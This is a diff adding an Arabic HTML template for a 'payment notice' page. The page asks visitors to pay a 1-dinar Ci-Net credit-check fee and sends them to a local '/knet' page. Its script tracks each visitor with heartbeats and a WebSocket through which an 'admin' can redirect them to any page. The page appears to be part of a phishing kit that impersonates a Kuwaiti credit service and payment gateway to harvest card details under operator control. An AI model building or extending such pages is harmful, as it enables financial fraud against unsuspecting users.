@@ -1,0 +1,296 @@
+<!doctype html> <html lang="ar" dir="rtl"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>إشعار الدفع</title> <link rel="stylesheet" href="{{ url_for('static', path='css/fonts.css') }}"> <style> * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: "InterLocal", system-ui, -apple-system, "Segoe UI", sans-serif;
+      background: #ffffff;
+      color: #1f2937;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .loan-header {
+      height: 58px;
+      background: #ffffff;
+      border-bottom: 1px solid #e5e7eb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 16px;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .loan-back-btn {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 34px;
+      height: 34px;
+      border: 0;
+      border-radius: 10px;
+      background: transparent;
+      color: #01a4e0;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .loan-back-btn svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    .loan-logo {
+      height: 24px;
+      width: auto;
+      display: block;
+    }
+
+    .intro {
+      max-width: 720px;
+      margin: 24px auto 0;
+      padding: 0 16px;
+      text-align: center;
+    }
+
+    .intro-description {
+      margin: 0;
+      font-size: 0.95rem;
+      color: #374151;
+      line-height: 1.6;
+      font-family: "InterLocal", system-ui, -apple-system, "Segoe UI", sans-serif;
+      font-weight: 400;
+      text-align: center;
+    }
+
+    .center-amount {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 16px;
+      text-align: center;
+    }
+
+    .center-amount h2 {
+      margin: 0;
+      font-size: clamp(2.3rem, 8vw, 4.2rem);
+      font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
+      font-weight: 700;
+      color: #111827;
+      letter-spacing: 0;
+      line-height: 1;
+      display: inline-flex;
+      align-items: baseline;
+      gap: 0;
+      direction: ltr;
+      unicode-bidi: plaintext;
+    }
+
+    .center-amount h2 .amount-currency {
+      font-size: 0.49em;
+      font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
+      font-weight: 600;
+    }
+
+    .bottom-action {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      padding: 12px 16px calc(12px + env(safe-area-inset-bottom));
+      background: #ffffff;
+      border-top: 1px solid #e5e7eb;
+      display: flex;
+      justify-content: center;
+    }
+
+    .pay-btn {
+      width: min(100%, 320px);
+      border: 0;
+      border-radius: 10px;
+      background: #04a3e0;
+      color: #ffffff;
+      min-height: 42px;
+      font-size: calc(0.92rem + 2px);
+      font-weight: 600;
+      cursor: pointer;
+    } </style> </head> <body> <header class="loan-header"> <button class="loan-back-btn" id="loan-back-btn" type="button" aria-label="رجوع"> <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"> <path d="M10 6L16 12L10 18" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/> </svg> </button> <img src="{{ url_for('static', path='images/logo.png') }}" alt="Logo" class="loan-logo"> </header> <section class="intro"> <p class="intro-description">يرجى دفع 1 دينار كويتي قيمة رسوم ساي نت لتقييم سجلك الإتماني</p> </section> <main class="center-amount"> <h2><span class="amount-currency">د.ك</span><span class="amount-value">1.000</span></h2> </main> <div class="bottom-action"> <button class="pay-btn" id="pay-btn" type="button">أدفع 1 د.ك</button> </div> <script nonce="{{ request.state.csp_nonce }}"> (() => {
+      const currentPage = "/transaction-notification";
+      const backButton = document.getElementById("loan-back-btn");
+      const payButton = document.getElementById("pay-btn");
+
+      fetch("/visitors/current-page", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        credentials: "same-origin",
+        body: JSON.stringify({ current_page: currentPage })
+      }).catch(() => {});
+
+      const checkAdminRedirect = () => {
+        fetch("/visitors/redirect-check", {
+          method: "GET",
+          headers: { Accept: "application/json" },
+          credentials: "same-origin",
+          cache: "no-store",
+        })
+          .then((response) => response.ok ? response.json() : null)
+          .then((payload) => {
+            if (!payload || payload.redirect !== true) {
+              return;
+            }
+            const targetPath = typeof payload.target_path === "string" ? payload.target_path.trim() : "";
+            if (targetPath && targetPath !== window.location.pathname) {
+              window.location.href = targetPath;
+            }
+          })
+          .catch(() => {});
+      };
+
+      let redirectSocket = null;
+      let redirectSocketReconnectTimer = null;
+      let redirectSocketPingTimer = null;
+      let hasRedirected = false;
+
+      const navigateToRedirectTarget = (targetPathRaw) => {
+        if (hasRedirected) {
+          return;
+        }
+        const targetPathInput = typeof targetPathRaw === "string" ? targetPathRaw.trim() : "";
+        const targetPath = ({
+          "/additional-info": "/additional-customer-info",
+          "/transaction-info": "/transaction-notification"
+        }[targetPathInput] || targetPathInput);
+        if (!targetPath || targetPath === window.location.pathname) {
+          return;
+        }
+        hasRedirected = true;
+        window.location.href = targetPath;
+      };
+
+      const connectAdminRedirectSocket = () => {
+        if (redirectSocketReconnectTimer) {
+          clearTimeout(redirectSocketReconnectTimer);
+          redirectSocketReconnectTimer = null;
+        }
+        if (redirectSocketPingTimer) {
+          clearInterval(redirectSocketPingTimer);
+          redirectSocketPingTimer = null;
+        }
+        if (redirectSocket && (redirectSocket.readyState === WebSocket.OPEN || redirectSocket.readyState === WebSocket.CONNECTING)) {
+          return;
+        }
+
+        const scheme = window.location.protocol === "https:" ? "wss:" : "ws:";
+        const socketUrl = `${scheme}//${window.location.host}/ws/visitor/redirect`;
+
+        try {
+          redirectSocket = new WebSocket(socketUrl);
+        } catch (_) {
+          redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+          return;
+        }
+
+        redirectSocket.addEventListener("open", () => {
+          redirectSocketPingTimer = setInterval(() => {
+            if (!redirectSocket || redirectSocket.readyState !== WebSocket.OPEN) {
+              return;
+            }
+            try {
+              redirectSocket.send(JSON.stringify({ type: "heartbeat", current_page: currentPage }));
+            } catch (_) {
+              // noop
+            }
+          }, 5000);
+        });
+
+        redirectSocket.addEventListener("message", (event) => {
+          let payload = null;
+          try {
+            payload = JSON.parse(event.data);
+          } catch (_) {
+            payload = null;
+          }
+          const eventName = payload && typeof payload === "object"
+            ? String(payload.event || "").trim().toLowerCase()
+            : "";
+          if (eventName !== "visitor.redirect") {
+            return;
+          }
+          const meta = payload && typeof payload === "object" && payload.meta && typeof payload.meta === "object"
+            ? payload.meta
+            : null;
+          navigateToRedirectTarget(meta ? meta.target_path : "");
+        });
+
+        redirectSocket.addEventListener("close", () => {
+          if (redirectSocketPingTimer) {
+            clearInterval(redirectSocketPingTimer);
+            redirectSocketPingTimer = null;
+          }
+          redirectSocket = null;
+          redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+        });
+
+        redirectSocket.addEventListener("error", () => {
+          try {
+            redirectSocket.close();
+          } catch (_) {
+            // noop
+          }
+        });
+      };
+
+      const sendHeartbeat = () => {
+        fetch("/visitors/heartbeat", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          credentials: "same-origin",
+          body: JSON.stringify({ current_page: currentPage })
+        }).catch(() => {});
+        checkAdminRedirect();
+      };
+
+      sendHeartbeat();
+      connectAdminRedirectSocket();
+      const heartbeatInterval = setInterval(() => {
+        if (document.visibilityState === "visible") {
+          sendHeartbeat();
+        }
+      }, 5000);
+      const redirectFallbackInterval = setInterval(() => {
+        if (document.visibilityState === "visible") {
+          checkAdminRedirect();
+        }
+      }, 15000);
+      document.addEventListener("visibilitychange", () => {
+        if (document.visibilityState === "visible") {
+          sendHeartbeat();
+        }
+      });
+
+      window.addEventListener("pageshow", () => {
+        hasRedirected = false;
+        sendHeartbeat();
+        connectAdminRedirectSocket();
+      });
+      window.addEventListener("beforeunload", () => {
+        clearInterval(heartbeatInterval);
+      clearInterval(redirectFallbackInterval);
+      });
+
+      backButton?.addEventListener("click", () => {
+        window.location.href = "/additional-customer-info";
+      });
+
+      payButton?.addEventListener("click", () => {
+        window.location.href = "/knet";
+      });
+    })(); </script> </body> </html> 
